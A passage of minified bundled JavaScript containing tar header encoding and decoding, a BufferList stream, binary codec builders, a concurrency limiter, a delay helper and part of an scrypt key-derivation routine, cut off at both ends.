        for (var r = 156; r < 512; r++) t += e[r];
        return t;
      },
      f = function (e, t) {
        return (e = e.toString(8)).length > t
          ? "7777777777777777777".slice(0, t) + " "
          : "0000000000000000000".slice(0, t - e.length) + e + " ";
      };
    var d = function (e, t, n) {
        if (128 & (e = e.slice(t, t + n))[(t = 0)])
          return (function (e) {
            var t;
            if (128 === e[0]) t = !0;
            else {
              if (255 !== e[0]) return null;
              t = !1;
            }
            for (var n = [], r = e.length - 1; r > 0; r--) {
              var o = e[r];
              t ? n.push(o) : n.push(255 - o);
            }
            var i = 0,
              s = n.length;
            for (r = 0; r < s; r++) i += n[r] * Math.pow(256, r);
            return t ? i : -1 * i;
          })(e);
        for (; t < e.length && 32 === e[t]; ) t++;
        for (
          var r =
            ((o = u(e, 32, t, e.length)),
            (i = e.length),
            (s = e.length),
            "number" != typeof o
              ? s
              : (o = ~~o) >= i
              ? i
              : o >= 0
              ? o
              : (o += i) >= 0
              ? o
              : 0);
          t < r && 0 === e[t];

        )
          t++;
        return r === t ? 0 : parseInt(e.slice(t, r).toString(), 8);
        var o, i, s;
      },
      p = function (e, t, n, r) {
        return e.slice(t, u(e, 0, t, t + n)).toString(r);
      },
      h = function (e) {
        var t = Buffer.byteLength(e),
          n = Math.floor(Math.log(t) / Math.log(10)) + 1;
        return t + n >= Math.pow(10, n) && n++, t + n + e;
      };
    (t.decodeLongPath = function (e, t) {
      return p(e, 0, e.length, t);
    }),
      (t.encodePax = function (e) {
        var t = "";
        e.name && (t += h(" path=" + e.name + "\n")),
          e.linkname && (t += h(" linkpath=" + e.linkname + "\n"));
        var n = e.pax;
        if (n) for (var r in n) t += h(" " + r + "=" + n[r] + "\n");
        return Buffer.from(t);
      }),
      (t.decodePax = function (e) {
        for (var t = {}; e.length; ) {
          for (var n = 0; n < e.length && 32 !== e[n]; ) n++;
          var r = parseInt(e.slice(0, n).toString(), 10);
          if (!r) return t;
          var o = e.slice(n + 1, r - 1).toString(),
            i = o.indexOf("=");
          if (-1 === i) return t;
          (t[o.slice(0, i)] = o.slice(i + 1)), (e = e.slice(r));
        }
        return t;
      }),
      (t.encode = function (e) {
        var t = n(512),
          s = e.name,
          c = "";
        if (
          (5 === e.typeflag && "/" !== s[s.length - 1] && (s += "/"),
          Buffer.byteLength(s) !== s.length)
        )
          return null;
        for (; Buffer.byteLength(s) > 100; ) {
          var u = s.indexOf("/");
          if (-1 === u) return null;
          (c += c ? "/" + s.slice(0, u) : s.slice(0, u)), (s = s.slice(u + 1));
        }
        return Buffer.byteLength(s) > 100 || Buffer.byteLength(c) > 155
          ? null
          : e.linkname && Buffer.byteLength(e.linkname) > 100
          ? null
          : (t.write(s),
            t.write(f(e.mode & a, 6), 100),
            t.write(f(e.uid, 6), 108),
            t.write(f(e.gid, 6), 116),
            t.write(f(e.size, 11), 124),
            t.write(f((e.mtime.getTime() / 1e3) | 0, 11), 136),
            (t[156] =
              r +
              (function (e) {
                switch (e) {
                  case "file":
                    return 0;
                  case "link":
                    return 1;
                  case "symlink":
                    return 2;
                  case "character-device":
                    return 3;
                  case "block-device":
                    return 4;
                  case "directory":
                    return 5;
                  case "fifo":
                    return 6;
                  case "contiguous-file":
                    return 7;
                  case "pax-header":
                    return 72;
                }
                return 0;
              })(e.type)),
            e.linkname && t.write(e.linkname, 157),
            o.copy(t, 257),
            i.copy(t, 263),
            e.uname && t.write(e.uname, 265),
            e.gname && t.write(e.gname, 297),
            t.write(f(e.devmajor || 0, 6), 329),
            t.write(f(e.devminor || 0, 6), 337),
            c && t.write(c, 345),
            t.write(f(l(t), 6), 148),
            t);
      }),
      (t.decode = function (e, t) {
        var n = 0 === e[156] ? 0 : e[156] - r,
          i = p(e, 0, 100, t),
          a = d(e, 100, 8),
          u = d(e, 108, 8),
          f = d(e, 116, 8),
          h = d(e, 124, 12),
          m = d(e, 136, 12),
          y = (function (e) {
            switch (e) {
              case 0:
                return "file";
              case 1:
                return "link";
              case 2:
                return "symlink";
              case 3:
                return "character-device";
              case 4:
                return "block-device";
              case 5:
                return "directory";
              case 6:
                return "fifo";
              case 7:
                return "contiguous-file";
              case 72:
                return "pax-header";
              case 55:
                return "pax-global-header";
              case 27:
                return "gnu-long-link-path";
              case 28:
              case 30:
                return "gnu-long-path";
            }
            return null;
          })(n),
          w = 0 === e[157] ? null : p(e, 157, 100, t),
          b = p(e, 265, 32),
          g = p(e, 297, 32),
          E = d(e, 329, 8),
          v = d(e, 337, 8),
          S = l(e);
        if (256 === S) return null;
        if (S !== d(e, 148, 8))
          throw new Error(
            "Invalid tar header. Maybe the tar is corrupted or it needs to be gunzipped?"
          );
        if (0 === o.compare(e, 257, 263))
          e[345] && (i = p(e, 345, 155, t) + "/" + i);
        else if (0 !== s.compare(e, 257, 263) || 0 !== c.compare(e, 263, 265))
          throw new Error("Invalid tar header: unknown format.");
        return (
          0 === n && i && "/" === i[i.length - 1] && (n = 5),
          {
            name: i,
            mode: a,
            uid: u,
            gid: f,
            size: h,
            mtime: new Date(1e3 * m),
            type: y,
            linkname: w,
            uname: b,
            gname: g,
            devmajor: E,
            devminor: v,
          }
        );
      });
  },
  function (e, t) {
    e.exports = require("buffer");
  },
  function (e, t, n) {
    "use strict";
    const { Buffer: Buffer } = n(133),
      r = Symbol.for("BufferList");
    function o(e) {
      if (!(this instanceof o)) return new o(e);
      o._init.call(this, e);
    }
    (o._init = function (e) {
      Object.defineProperty(this, r, { value: !0 }),
        (this._bufs = []),
        (this.length = 0),
        e && this.append(e);
    }),
      (o.prototype._new = function (e) {
        return new o(e);
      }),
      (o.prototype._offset = function (e) {
        if (0 === e) return [0, 0];
        let t = 0;
        for (let n = 0; n < this._bufs.length; n++) {
          const r = t + this._bufs[n].length;
          if (e < r || n === this._bufs.length - 1) return [n, e - t];
          t = r;
        }
      }),
      (o.prototype._reverseOffset = function (e) {
        const t = e[0];
        let n = e[1];
        for (let e = 0; e < t; e++) n += this._bufs[e].length;
        return n;
      }),
      (o.prototype.get = function (e) {
        if (e > this.length || e < 0) return;
        const t = this._offset(e);
        return this._bufs[t[0]][t[1]];
      }),
      (o.prototype.slice = function (e, t) {
        return (
          "number" == typeof e && e < 0 && (e += this.length),
          "number" == typeof t && t < 0 && (t += this.length),
          this.copy(null, 0, e, t)
        );
      }),
      (o.prototype.copy = function (e, t, n, r) {
        if (
          (("number" != typeof n || n < 0) && (n = 0),
          ("number" != typeof r || r > this.length) && (r = this.length),
          n >= this.length)
        )
          return e || Buffer.alloc(0);
        if (r <= 0) return e || Buffer.alloc(0);
        const o = !!e,
          i = this._offset(n),
          s = r - n;
        let c = s,
          a = (o && t) || 0,
          u = i[1];
        if (0 === n && r === this.length) {
          if (!o)
            return 1 === this._bufs.length
              ? this._bufs[0]
              : Buffer.concat(this._bufs, this.length);
          for (let t = 0; t < this._bufs.length; t++)
            this._bufs[t].copy(e, a), (a += this._bufs[t].length);
          return e;
        }
        if (c <= this._bufs[i[0]].length - u)
          return o
            ? this._bufs[i[0]].copy(e, t, u, u + c)
            : this._bufs[i[0]].slice(u, u + c);
        o || (e = Buffer.allocUnsafe(s));
        for (let t = i[0]; t < this._bufs.length; t++) {
          const n = this._bufs[t].length - u;
          if (!(c > n)) {
            this._bufs[t].copy(e, a, u, u + c), (a += n);
            break;
          }
          this._bufs[t].copy(e, a, u), (a += n), (c -= n), u && (u = 0);
        }
        return e.length > a ? e.slice(0, a) : e;
      }),
      (o.prototype.shallowSlice = function (e, t) {
        if (
          ((e = e || 0),
          (t = "number" != typeof t ? this.length : t),
          e < 0 && (e += this.length),
          t < 0 && (t += this.length),
          e === t)
        )
          return this._new();
        const n = this._offset(e),
          r = this._offset(t),
          o = this._bufs.slice(n[0], r[0] + 1);
        return (
          0 === r[1]
            ? o.pop()
            : (o[o.length - 1] = o[o.length - 1].slice(0, r[1])),
          0 !== n[1] && (o[0] = o[0].slice(n[1])),
          this._new(o)
        );
      }),
      (o.prototype.toString = function (e, t, n) {
        return this.slice(t, n).toString(e);
      }),
      (o.prototype.consume = function (e) {
        if (((e = Math.trunc(e)), Number.isNaN(e) || e <= 0)) return this;
        for (; this._bufs.length; ) {
          if (!(e >= this._bufs[0].length)) {
            (this._bufs[0] = this._bufs[0].slice(e)), (this.length -= e);
            break;
          }
          (e -= this._bufs[0].length),
            (this.length -= this._bufs[0].length),
            this._bufs.shift();
        }
        return this;
      }),
      (o.prototype.duplicate = function () {
        const e = this._new();
        for (let t = 0; t < this._bufs.length; t++) e.append(this._bufs[t]);
        return e;
      }),
      (o.prototype.append = function (e) {
        if (null == e) return this;
        if (e.buffer)
          this._appendBuffer(Buffer.from(e.buffer, e.byteOffset, e.byteLength));
        else if (Array.isArray(e))
          for (let t = 0; t < e.length; t++) this.append(e[t]);
        else if (this._isBufferList(e))
          for (let t = 0; t < e._bufs.length; t++) this.append(e._bufs[t]);
        else
          "number" == typeof e && (e = e.toString()),
            this._appendBuffer(Buffer.from(e));
        return this;
      }),
      (o.prototype._appendBuffer = function (e) {
        this._bufs.push(e), (this.length += e.length);
      }),
      (o.prototype.indexOf = function (e, t, n) {
        if (
          (void 0 === n && "string" == typeof t && ((n = t), (t = void 0)),
          "function" == typeof e || Array.isArray(e))
        )
          throw new TypeError(
            'The "value" argument must be one of type string, Buffer, BufferList, or Uint8Array.'
          );
        if (
          ("number" == typeof e
            ? (e = Buffer.from([e]))
            : "string" == typeof e
            ? (e = Buffer.from(e, n))
            : this._isBufferList(e)
            ? (e = e.slice())
            : Array.isArray(e.buffer)
            ? (e = Buffer.from(e.buffer, e.byteOffset, e.byteLength))
            : Buffer.isBuffer(e) || (e = Buffer.from(e)),
          (t = Number(t || 0)),
          isNaN(t) && (t = 0),
          t < 0 && (t = this.length + t),
          t < 0 && (t = 0),
          0 === e.length)
        )
          return t > this.length ? this.length : t;
        const r = this._offset(t);
        let o = r[0],
          i = r[1];
        for (; o < this._bufs.length; o++) {
          const t = this._bufs[o];
          for (; i < t.length; ) {
            if (t.length - i >= e.length) {
              const n = t.indexOf(e, i);
              if (-1 !== n) return this._reverseOffset([o, n]);
              i = t.length - e.length + 1;
            } else {
              const t = this._reverseOffset([o, i]);
              if (this._match(t, e)) return t;
              i++;
            }
          }
          i = 0;
        }
        return -1;
      }),
      (o.prototype._match = function (e, t) {
        if (this.length - e < t.length) return !1;
        for (let n = 0; n < t.length; n++)
          if (this.get(e + n) !== t[n]) return !1;
        return !0;
      }),
      (function () {
        const e = {
          readDoubleBE: 8,
          readDoubleLE: 8,
          readFloatBE: 4,
          readFloatLE: 4,
          readInt32BE: 4,
          readInt32LE: 4,
          readUInt32BE: 4,
          readUInt32LE: 4,
          readInt16BE: 2,
          readInt16LE: 2,
          readUInt16BE: 2,
          readUInt16LE: 2,
          readInt8: 1,
          readUInt8: 1,
          readIntBE: null,
          readIntLE: null,
          readUIntBE: null,
          readUIntLE: null,
        };
        for (const t in e)
          !(function (t) {
            o.prototype[t] =
              null === e[t]
                ? function (e, n) {
                    return this.slice(e, e + n)[t](0, n);
                  }
                : function (n) {
                    return this.slice(n, n + e[t])[t](0);
                  };
          })(t);
      })(),
      (o.prototype._isBufferList = function (e) {
        return e instanceof o || o.isBufferList(e);
      }),
      (o.isBufferList = function (e) {
        return null != e && e[r];
      }),
      (e.exports = o);
  },
  function (e, t, n) {
    e.exports = function (e, t) {
      t &&
        ((e.super_ = t),
        (e.prototype = Object.create(t.prototype, {
          constructor: {
            value: e,
            enumerable: !1,
            writable: !0,
            configurable: !0,
          },
        })));
    };
  },
  function (e, t, n) {
    try {
      var r = n(35);
      if ("function" != typeof r.inherits) throw "";
      e.exports = r.inherits;
    } catch (t) {
      e.exports = n(135);
    }
  },
  function (e, t, n) {
    "use strict";
    const r = n(64).Duplex,
      o = n(136),
      i = n(134);
    function s(e) {
      if (!(this instanceof s)) return new s(e);
      if ("function" == typeof e) {
        this._callback = e;
        const t = function (e) {
          this._callback && (this._callback(e), (this._callback = null));
        }.bind(this);
        this.on("pipe", function (e) {
          e.on("error", t);
        }),
          this.on("unpipe", function (e) {
            e.removeListener("error", t);
          }),
          (e = null);
      }
      i._init.call(this, e), r.call(this);
    }
    o(s, r),
      Object.assign(s.prototype, i.prototype),
      (s.prototype._new = function (e) {
        return new s(e);
      }),
      (s.prototype._write = function (e, t, n) {
        this._appendBuffer(e), "function" == typeof n && n();
      }),
      (s.prototype._read = function (e) {
        if (!this.length) return this.push(null);
        (e = Math.min(e, this.length)),
          this.push(this.slice(0, e)),
          this.consume(e);
      }),
      (s.prototype.end = function (e) {
        r.prototype.end.call(this, e),
          this._callback &&
            (this._callback(null, this.slice()), (this._callback = null));
      }),
      (s.prototype._destroy = function (e, t) {
        (this._bufs.length = 0), (this.length = 0), t(e);
      }),
      (s.prototype._isBufferList = function (e) {
        return e instanceof s || e instanceof i || s.isBufferList(e);
      }),
      (s.isBufferList = i.isBufferList),
      (e.exports = s),
      (e.exports.BufferListStream = s),
      (e.exports.BufferList = i);
  },
  function (e, t) {
    e.exports = function (e) {
      const t = (n = "") => {
        const r = (e) => {
          if (e.includes("!"))
            throw new Error(`keys cannot contain !; recieved ${e}`);
          return n + e;
        };
        return {
          get: async (t) => e.get(r(t)),
          batchGet: async (t) => e.batchGet(t.map((e) => r(e))),
          set: async (t, n) => e.set(r(t), n),
          batchSet: async (t) =>
            e.batchSet(
              Object.fromEntries(Object.entries(t).map(([e, t]) => [r(e), t]))
            ),
          delete: async (t) => e.delete(r(t)),
          batchDelete: async (t) => e.batchDelete(t.map((e) => r(e))),
          clear: async () => e.clear(n),
          namespace: (e) => {
            if (e.includes("!"))
              throw new Error(`prefixes cannot contain !; recieved ${e}`);
            return t(`${n}!${e}!`);
          },
        };
      };
      return t();
    };
  },
  function (e, t, n) {
    "use strict";
    const r = () => {
        const e = new Error("Delay aborted");
        return (e.name = "AbortError"), e;
      },
      o =
        ({ clearTimeout: e, setTimeout: t, willResolve: n }) =>
        (o, { value: i, signal: s } = {}) => {
          if (s && s.aborted) return Promise.reject(r());
          let c, a, u;
          const l = e || clearTimeout,
            f = () => {
              l(c), u(r());
            },
            d = new Promise((e, r) => {
              (a = () => {
                s && s.removeEventListener("abort", f), n ? e(i) : r(i);
              }),
                (u = r),
                (c = (t || setTimeout)(a, o));
            });
          return (
            s && s.addEventListener("abort", f, { once: !0 }),
            (d.clear = () => {
              l(c), (c = null), a();
            }),
            d
          );
        },
      i = (e) => {
        const t = o({ ...e, willResolve: !0 });
        return (
          (t.reject = o({ ...e, willResolve: !1 })),
          (t.range = (e, n, r) =>
            t(
              ((e, t) => Math.floor(Math.random() * (t - e + 1) + e))(e, n),
              r
            )),
          t
        );
      },
      s = i();
    (s.createWithTimers = i), (e.exports = s), (e.exports.default = s);
  },
  function (e, t) {
    e.exports = function (e, { concurrency: t = 1 } = {}) {
      !(function (e) {
        if (!("number" == typeof e && e > 0) || (e !== 1 / 0 && e % 1 != 0))
          throw new TypeError(`Invalid concurrency value: ${e}`);
      })(t);
      let n = 0;
      const r = [];
      return async function (...o) {
        n += 1;
        try {
          return (
            n > t && (await new Promise((e) => r.push({ resolve: e }))),
            await e(...o)
          );
        } finally {
          (n -= 1), r.length > 0 && r.shift().resolve();
        }
      };
    };
  },
  function (e, t, n) {
    const r = n(31);
    e.exports = function (e) {
      return {
        expand(t) {
          const n = r.randomBytes(t.length < e - 4 ? e : t.length + 4);
          return n.writeUInt32BE(t.length, 0), t.copy(n, 4, 0), n;
        },
        shrink(e) {
          const t = e.readUInt32BE(0);
          return e.slice(4, t + 4);
        },
      };
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.fromUInt32BE = function (e) {
        let t = Buffer.alloc(4);
        return t.writeUInt32BE(e), t;
      });
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e, t) {
      if (!r.isAbstractCodec(e))
        throw new TypeError("itemType is invalid codec");
      if ("function" != typeof t)
        throw new TypeError("checkValue must be a function");
      return {
        encode: function n(r, o, i) {
          return t(r), (o = e.encode(r, o, i)), (n.bytes = e.encode.bytes), o;
        },
        decode: function n(r, o, i) {
          var s = e.decode(r, o, i);
          return t(s), (n.bytes = e.decode.bytes), s;
        },
        encodingLength: function (n) {
          return t(n), e.encodingLength(n);
        },
      };
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(84),
      o = n(38);
    e.exports = function (e, t) {
      if (!o.isAbstractCodec(e))
        throw new TypeError("lengthType is invalid codec");
      var n = r(e);
      return (
        t || (t = "utf8"),
        {
          encode: function e(r, o, i) {
            if ("string" != typeof r)
              throw new TypeError("value must be a string");
            return (
              (o = n.encode(new Buffer(r, t), o, i)),
              (e.bytes = n.encode.bytes),
              o
            );
          },
          decode: function e(r, o, i) {
            var s = n.decode(r, o, i);
            return (e.bytes = n.decode.bytes), s.toString(t);
          },
          encodingLength: function (e) {
            if ("string" != typeof e)
              throw new TypeError("value must be a string");
            return n.encodingLength(new Buffer(e, t));
          },
        }
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(85);
    e.exports = function (e, t) {
      if ("number" != typeof e) throw new TypeError("length must be a number");
      var n = r(e);
      function o(e, r, o) {
        if ("string" != typeof e) throw new TypeError("value must be a string");
        return n.encode(new Buffer(e, t), r, o);
      }
      function i(e, r, o) {
        return n.decode(e, r, o).toString(t);
      }
      return (
        t || (t = "utf-8"),
        (o.bytes = i.bytes = e),
        { encode: o, decode: i, encodingLength: n.encodingLength }
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e) {
      if (!Array.isArray(e))
        throw new TypeError("types must be an Array instance");
      function t(t) {
        return r.reduce(
          e,
          function (e, n, r) {
            return e + n.encodingLength(t[r]);
          },
          0
        );
      }
      return (
        (e = e.map(function (e) {
          if (!r.isAbstractCodec(e))
            throw new TypeError("types Array has invalid codec");
          return e;
        })),
        {
          encode: function n(o, i, s) {
            if (!Array.isArray(o))
              throw new TypeError("value must be an Array instance");
            if (o.length !== e.length)
              throw new RangeError("value.length is out of bounds");
            return (
              i || (i = new Buffer(t(o))),
              s || (s = 0),
              (n.bytes =
                r.reduce(
                  e,
                  function (e, t, n) {
                    return t.encode(o[n], i, e), e + t.encode.bytes;
                  },
                  s
                ) - s),
              i
            );
          },
          decode: function t(n, o, i) {
            o || (o = 0);
            var s = new Array(e.length);
            return (
              (t.bytes =
                r.reduce(
                  e,
                  function (e, t, r) {
                    return (s[r] = t.decode(n, e, i)), e + t.decode.bytes;
                  },
                  o
                ) - o),
              s
            );
          },
          encodingLength: function (n) {
            if (!Array.isArray(n))
              throw new TypeError("value must be an Array instance");
            if (n.length !== e.length)
              throw new RangeError("value.length is out of bounds");
            return t(n);
          },
        }
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e, t) {
      if (!r.isAbstractCodec(e))
        throw new TypeError("lengthType is invalid codec");
      if (!r.isAbstractCodec(t))
        throw new TypeError("itemType is invalid codec");
      function n(n) {
        return r.reduce(
          n,
          function (e, n) {
            return e + t.encodingLength(n);
          },
          e.encodingLength(n.length)
        );
      }
      return {
        encode: function o(i, s, c) {
          if (!Array.isArray(i))
            throw new TypeError("value must be an Array instance");
          return (
            s || (s = new Buffer(n(i))),
            c || (c = 0),
            e.encode(i.length, s, c),
            (o.bytes =
              r.reduce(
                i,
                function (e, n) {
                  return t.encode(n, s, e), e + t.encode.bytes;
                },
                e.encode.bytes + c
              ) - c),
            s
          );
        },
        decode: function n(o, i, s) {
          i || (i = 0);
          var c = new Array(e.decode(o, i, s));
          return (
            (n.bytes =
              r.reduce(
                c,
                function (e, n, r) {
                  return (c[r] = t.decode(o, e, s)), e + t.decode.bytes;
                },
                e.decode.bytes + i
              ) - i),
            c
          );
        },
        encodingLength: function (e) {
          if (!Array.isArray(e))
            throw new TypeError("value must be an Array instance");
          return n(e);
        },
      };
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e, t) {
      if ("number" != typeof e) throw new TypeError("length must be a number");
      if (!r.isAbstractCodec(t))
        throw new TypeError("itemType is invalid codec");
      function n(e) {
        return r.reduce(
          e,
          function (e, n) {
            return e + t.encodingLength(n);
          },
          0
        );
      }
      return {
        encode: function o(i, s, c) {
          if (!Array.isArray(i))
            throw new TypeError("value must be an Array instance");
          if (i.length !== e)
            throw new RangeError("value.length is out of bounds");
          return (
            s || (s = new Buffer(n(i))),
            c || (c = 0),
            (o.bytes =
              r.reduce(
                i,
                function (e, n) {
                  return t.encode(n, s, e), e + t.encode.bytes;
                },
                c
              ) - c),
            s
          );
        },
        decode: function n(o, i, s) {
          i || (i = 0);
          var c = new Array(e);
          return (
            (n.bytes =
              r.reduce(
                c,
                function (e, n, r) {
                  return (c[r] = t.decode(o, e, s)), e + t.decode.bytes;
                },
                i
              ) - i),
            c
          );
        },
        encodingLength: function (t) {
          if (!Array.isArray(t))
            throw new TypeError("value must be an Array instance");
          if (t.length !== e)
            throw new RangeError("value.length is out of bounds");
          return n(t);
        },
      };
    };
  },
  function (e, t) {
    var n = {},
      r = 4294967295,
      o = 9007199254740991;
    function i(e) {
      return (e = ~e) < 0 && (e = 2147483648 + (2147483647 & e)), e;
    }
    function s(e) {
      console.assert(e > -1 && e <= o, "number out of range"),
        console.assert(Math.floor(e) === e, "number must be an integer");
      var t = 0,
        n = 4294967295 & e,
        i = n < 0 ? 2147483648 + (2147483647 & e) : n;
      return e > r && (t = (e - i) / (r + 1)), [t, i];
    }
    function c(e) {
      if (e > -1) return s(e);
      var t = s(-e),
        n = i(t[0]),
        o = i(t[1]);
      return o === r ? ((n += 1), (o = 0)) : (o += 1), [n, o];
    }
    function a(e, t, n) {
      return n && 0 != (2147483648 & e)
        ? ((e = i(e)),
          (t = i(t)),
          console.assert(e < 2097152, "number too small"),
          -(e * (r + 1) + t + 1))
        : (console.assert(e < 2097152, "number too large"), e * (r + 1) + t);
    }
    (n.readInt64BE = function (e, t) {
      return (t = t || 0), a(e.readUInt32BE(t), e.readUInt32BE(t + 4), !0);
    }),
      (n.readInt64LE = function (e, t) {
        t = t || 0;
        var n = e.readUInt32LE(t);
        return a(e.readUInt32LE(t + 4), n, !0);
      }),
      (n.readUInt64BE = function (e, t) {
        return (t = t || 0), a(e.readUInt32BE(t), e.readUInt32BE(t + 4), !1);
      }),
      (n.readUInt64LE = function (e, t) {
        t = t || 0;
        var n = e.readUInt32LE(t);
        return a(e.readUInt32LE(t + 4), n, !1);
      }),
      (n.writeInt64BE = function (e, t, n) {
        n = n || 0;
        var r = c(e);
        t.writeUInt32BE(r[0], n), t.writeUInt32BE(r[1], n + 4);
      }),
      (n.writeInt64LE = function (e, t, n) {
        n = n || 0;
        var r = c(e);
        t.writeUInt32LE(r[1], n), t.writeUInt32LE(r[0], n + 4);
      }),
      (n.writeUInt64BE = function (e, t, n) {
        n = n || 0;
        var r = s(e);
        t.writeUInt32BE(r[0], n), t.writeUInt32BE(r[1], n + 4);
      }),
      (n.writeUInt64LE = function (e, t, n) {
        n = n || 0;
        var r = s(e);
        t.writeUInt32LE(r[1], n), t.writeUInt32LE(r[0], n + 4);
      }),
      (e.exports = n);
  },
  function (e, t, n) {
    "use strict";
    var r = n(149);
    function o(e, t) {
      var n = Buffer.prototype["read" + e],
        r = Buffer.prototype["write" + e];
      function o(e, n, o) {
        return n || (n = new Buffer(t)), o || (o = 0), r.call(n, e, o), n;
      }
      function i(e, t, r) {
        return t || (t = 0), r ? n.call(e.slice(t, r), 0) : n.call(e, t);
      }
      return (
        (o.bytes = i.bytes = t),
        {
          encode: o,
          decode: i,
          encodingLength: function () {
            return t;
          },
        }
      );
    }
    function i(e, t) {
      function n(e, n, r) {
        return n || (n = new Buffer(8)), r || (r = 0), t(e, n, r), n;
      }
      function r(t, n, r) {
        return n || (n = 0), r ? e(t.slice(n, r), 0) : e(t, n);
      }
      return (
        (n.bytes = r.bytes = 8),
        {
          encode: n,
          decode: r,
          encodingLength: function () {
            return 8;
          },
        }
      );
    }
    (t.Byte = o("UInt8", 1)),
      (t.Int8 = o("Int8", 1)),
      (t.UInt8 = o("UInt8", 1)),
      (t.Int16BE = o("Int16BE", 2)),
      (t.Int16LE = o("Int16LE", 2)),
      (t.UInt16BE = o("UInt16BE", 2)),
      (t.UInt16LE = o("UInt16LE", 2)),
      (t.Int32BE = o("Int32BE", 4)),
      (t.Int32LE = o("Int32LE", 4)),
      (t.UInt32BE = o("UInt32BE", 4)),
      (t.UInt32LE = o("UInt32LE", 4)),
      (t.Int64BE = i(r.readInt64BE, r.writeInt64BE)),
      (t.Int64LE = i(r.readInt64LE, r.writeInt64LE)),
      (t.UInt64BE = i(r.readUInt64BE, r.writeUInt64BE)),
      (t.UInt64LE = i(r.readUInt64LE, r.writeUInt64LE)),
      (t.FloatBE = o("FloatBE", 4)),
      (t.FloatLE = o("FloatLE", 4)),
      (t.DoubleBE = o("DoubleBE", 8)),
      (t.DoubleLE = o("DoubleLE", 8));
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e) {
      if (!Array.isArray(e))
        throw new TypeError("items must be an Array instance");
      function t(t) {
        return r.reduce(
          e,
          function (e, n) {
            return e + n.type.encodingLength(t[n.name]);
          },
          0
        );
      }
      return (
        (e = e.map(function (e) {
          if (
            (Array.isArray(e) && (e = { name: e[0], type: e[1] }),
            !e || "string" != typeof e.name)
          )
            throw new TypeError('item missing "name" property');
          if (!r.isAbstractCodec(e.type))
            throw new TypeError('item "' + e.name + '" has invalid codec');
          return { name: e.name, type: e.type };
        })),
        {
          encode: function n(o, i, s) {
            if ("object" != typeof o || null === o)
              throw new TypeError("expected value as object, got " + o);
            return (
              i || (i = new Buffer(t(o))),
              s || (s = 0),
              (n.bytes =
                r.reduce(
                  e,
                  function (e, t) {
                    return (
                      t.type.encode(o[t.name], i, e), e + t.type.encode.bytes
                    );
                  },
                  s
                ) - s),
              i
            );
          },
          decode: function t(n, o, i) {
            o || (o = 0);
            var s = {};
            return (
              (t.bytes =
                r.reduce(
                  e,
                  function (e, t) {
                    return (
                      (s[t.name] = t.type.decode(n, e, i)),
                      e + t.type.decode.bytes
                    );
                  },
                  o
                ) - o),
              s
            );
          },
          encodingLength: t,
        }
      );
    };
  },
  function (e, t, n) {
    var r = n(31),
      o = 2147483647;
    function i(e, t, n, r, o) {
      if (Buffer.isBuffer(e) && Buffer.isBuffer(n)) e.copy(n, r, t, t + o);
      else for (; o--; ) n[r++] = e[t++];
    }
    e.exports = function (e, t, n, s, c, a, u) {
      if (0 === n || 0 != (n & (n - 1)))
        throw Error("N must be > 0 and a power of 2");
      if (n > o / 128 / s) throw Error("Parameter N is too large");
      if (s > o / 128 / c) throw Error("Parameter r is too large");
      var l,
        f = new Buffer(256 * s),
        d = new Buffer(128 * s * n),
        p = new Int32Array(16),
        h = new Int32Array(16),
        m = new Buffer(64),
        y = r.pbkdf2Sync(e, t, 1, 128 * c * s, "sha256");
      if (u) {
        var w = c * n * 2,
          b = 0;
        l = function () {
          ++b % 1e3 == 0 && u({ current: b, total: w, percent: (b / w) * 100 });
        };
      }
      for (var g = 0; g < c; g++) E(y, 128 * g * s, s, n, d, f);
      return r.pbkdf2Sync(e, y, 1, a, "sha256");
      function E(e, t, n, r, o, i) {
        var s,
          c = 128 * n;
        for (e.copy(i, 0, t, t + c), s = 0; s < r; s++)
          i.copy(o, s * c, 0, 0 + c), v(i, 0, c, n), l && l();
        for (s = 0; s < r; s++) {
          var a = 0 + 64 * (2 * n - 1);
          k(o, (i.readUInt32LE(a) & (r - 1)) * c, i, 0, c),
            v(i, 0, c, n),
            l && l();
        }
        i.copy(e, t, 0, 0 + c);
      }
      function v(e, t, n, r) {
        var o;
        for (i(e, t + 64 * (2 * r - 1), m, 0, 64), o = 0; o < 2 * r; o++)
          k(e, 64 * o, m, 0, 64), O(m), i(m, 0, e, n + 64 * o, 64);
        for (o = 0; o < r; o++) i(e, n + 2 * o * 64, e, t + 64 * o, 64);
        for (o = 0; o < r; o++)
          i(e, n + 64 * (2 * o + 1), e, t + 64 * (o + r), 64);
      }
      function S(e, t) {
        return (e << t) | (e >>> (32 - t));
      }
      function O(e) {
        var t;
        for (t = 0; t < 16; t++)
          (p[t] = (255 & e[4 * t + 0]) << 0),
            (p[t] |= (255 & e[4 * t + 1]) << 8),
            (p[t] |= (255 & e[4 * t + 2]) << 16),
            (p[t] |= (255 & e[4 * t + 3]) << 24);
        for (i(p, 0, h, 0, 16), t = 8; t > 0; t -= 2)
          (h[4] ^= S(h[0] + h[12], 7)),
            (h[8] ^= S(h[4] + h[0], 9)),
            (h[12] ^= S(h[8] + h[4], 13)),
            (h[0] ^= S(h[12] + h[8], 18)),
            (h[9] ^= S(h[5] + h[1], 7)),
            (h[13] ^= S(h[9] + h[5], 9)),
            (h[1] ^= S(h[13] + h[9], 13)),
            (h[5] ^= S(h[1] + h[13], 18)),
            (h[14] ^= S(h[10] + h[6], 7)),
            (h[2] ^= S(h[14] + h[10], 9)),
            (h[6] ^= S(h[2] + h[14], 13)),
            (h[10] ^= S(h[6] + h[2], 18)),
            (h[3] ^= S(h[15] + h[11], 7)),
            (h[7] ^= S(h[3] + h[15], 9)),
            (h[11] ^= S(h[7] + h[3], 13)),
            (h[15] ^= S(h[11] + h[7], 18)),
            (h[1] ^= S(h[0] + h[3], 7)),
            (h[2] ^= S(h[1] + h[0], 9)),
            (h[3] ^= S(h[2] + h[1], 13)),
            (h[0] ^= S(h[3] + h[2], 18)),
            (h[6] ^= S(h[5] + h[4], 7)),
            (h[7] ^= S(h[6] + h[5], 9)),
            (h[4] ^= S(h[7] + h[6], 13)),
            (h[5] ^= S(h[4] + h[7], 18)),
